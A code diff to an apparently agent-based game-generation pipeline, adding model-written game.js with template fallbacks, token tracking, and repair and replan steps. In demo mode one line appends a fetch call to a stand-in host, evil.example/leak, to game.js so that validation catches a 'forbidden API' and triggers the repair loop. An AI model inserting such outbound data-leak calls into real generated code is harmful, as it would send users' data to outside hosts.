@@ -129,17 +129,45 @@ def _should_inject(state: dict) -> bool:
     return False
 
 
-def _render_code(state: dict) -> list[dict]:
+def _extract_js(raw: str) -> str:
+    if not raw:
+        return ""
+    m = re.search(r"```(?:javascript|js)?\s*(.*?)```", raw, re.S | re.I)
+    s = (m.group(1) if m else raw).strip()
+    return re.sub(r"</?script[^>]*>", "", s, flags=re.I).strip()
+
+
+def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str]:
+    """渲染模板外壳；real 模式让模型写 game.js（真正生成不同的游戏），失败/兜底用模板 game.js。"""
     spec = state.get("game_spec") or {}
     design = state.get("game_design") or {}
     tname = templating.select_template(spec, design)
     cfg = templating.build_config(spec, design, state.get("asset_manifest") or {})
     files = templating.render_files(tname, cfg)
+    tokens = 0
+    mode = "template"
+
+    if state.get("use_real") and not state.get("use_template_code"):
+        try:
+            index_html = next((f["content"] for f in files if f["path"] == "index.html"), "")
+            raw, tokens = llm.chat(prompts.CODE_SYSTEM_PROMPT,
+                                   prompts.build_code_prompt(spec, design, index_html, repair_error))
+            js = _extract_js(raw)
+            if js and len(js) > 120:
+                for f in files:
+                    if f["path"] == "game.js":
+                        f["content"] = js
+                mode = "model"
+            else:
+                mode = "template (model output too short)"
+        except Exception as exc:  # noqa: BLE001
+            mode = f"template (model failed: {exc})"
+
     if _should_inject(state):
         for f in files:
             if f["path"] == "game.js":
                 f["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
-    return files
+    return files, tokens, mode
 
 
 # ---------- nodes ----------
@@ -224,12 +252,12 @@ def game_design_node(state: dict) -> dict:
 
 
 def code_generation_node(state: dict) -> dict:
-    files = _render_code(state)
+    files, tokens, mode = _generate_code(state)
     tname = templating.select_template(state.get("game_spec"), state.get("game_design"))
-    logs = [f"selected template: {tname}", "rendered index.html / style.css / game.js from config"]
+    logs = [f"template shell: {tname}", f"game.js source: {mode}", "rendered index.html / style.css / game.js"]
     if _should_inject(state):
         logs.append("[demo] injected forbidden API to trigger repair loop")
-    return {"generated_files": files, "_agent": "GameCodeAgent", "_logs": logs}
+    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}
 
 
 def build_validation_node(state: dict) -> dict:
@@ -243,10 +271,10 @@ def build_validation_node(state: dict) -> dict:
 
 def repair_code_node(state: dict) -> dict:
     attempts = state.get("repair_attempts", 0) + 1
-    files = _render_code({**state, "repair_attempts": attempts})
+    files, tokens, mode = _generate_code({**state, "repair_attempts": attempts}, repair_error=state.get("last_error"))
     return {"generated_files": files, "repair_attempts": attempts, "_agent": "GameCodeAgentRepair",
-            "_logs": [f"repair attempt #{attempts}: re-rendered from template",
-                      "removed offending code; back to validation"]}
+            "_tokens_delta": tokens,
+            "_logs": [f"repair attempt #{attempts}: regenerated game.js ({mode})", "back to validation"]}
 
 
 def replan_game_design_node(state: dict) -> dict:
@@ -266,8 +294,10 @@ def replan_game_design_node(state: dict) -> dict:
     return {
         "game_design": design, "generated_files": [], "validation_result": {},
         "repair_attempts": 0, "replan_attempts": attempts, "last_error": None,
+        "use_template_code": True,  # 兜底：用稳定模板 game.js，保证重生成可通过校验
         "_agent": "GameDesignAgentReplan",
-        "_logs": [f"replan #{attempts}: simplified design to fit runtime", "reset repair; back to code generation"],
+        "_logs": [f"replan #{attempts}: simplified design + fall back to template code",
+                  "reset repair; back to code generation"],
         **extra,
     }
 
